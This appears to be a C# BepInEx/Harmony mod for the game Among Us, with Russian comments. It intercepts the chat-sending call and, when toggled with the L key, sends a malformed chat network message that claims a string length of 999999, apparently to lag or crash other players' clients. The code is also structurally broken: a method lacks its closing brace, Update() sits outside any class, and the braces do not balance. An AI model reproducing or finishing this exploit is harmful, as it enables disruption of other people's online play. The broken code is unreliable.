using BepInEx;
using BepInEx.Logging;
using BepInEx.Unity.IL2CPP;
using HarmonyLib;
using System;
using AmongUs.GameOptions;
using Hazel;
using UnityEngine;

namespace CPlugin
{
    [BepInPlugin(id, plugin_name, versionString)]
    public class Plugin : BasePlugin
    {
        public const string id = "com.xd.sah_mod";
        public const string plugin_name = "shittyasshole_mod";
        public const string versionString = "1.0.0";

        private readonly Harmony harmony = new Harmony(id);

        public static bool IsLagEnabled = false;

        public override void Load()
        {
            Log.LogInfo($"Плагин {plugin_name} загружен!");

            harmony.PatchAll();
            
        public override void Unload()
        {
            harmony.UnpatchSelf();
            Log.LogInfo($"Плагин {plugin_name} выгружен.");
            base.Unload();
        }
    }

    [HarmonyPatch]
    internal static class Patches
    {
        [HarmonyPatch(typeof(PlayerControl), nameof(PlayerControl.RpcSendChat))]
        [HarmonyPrefix]
        private static bool RpcSendChat_Prefix(PlayerControl __instance, string chatText)
        {
            if (!Plugin.IsLagEnabled)
            {
                return true;
            }

            // Для логирования из статического класса нужно получить доступ к логгеру плагина.
            // Один из способов - передать его в конструктор, но проще сделать его публичным статическим.
            // В данном примере мы оставим логирование в основном классе плагина.
            // Если нужно здесь, можно сделать Log в Plugin публичным статическим.
            // Plugin.Log.LogWarning("Перехват отправки чата..."); // <-- так сработает, если Log в Plugin публичный

            MessageWriter writer = AmongUsClient.Instance.StartRpc(__instance.NetId, (byte)RpcCalls.SendChat);
            int maliciousStringLength = 999999;
            writer.Write(maliciousStringLength);
            writer.EndMessage();
            
            return false;
        }
    }
    
void Update(){

    if (Input.GetKeyDown(KeyCode.L))
    {
        IsLagEnabled = !IsLagEnabled;
    }
}

}
}
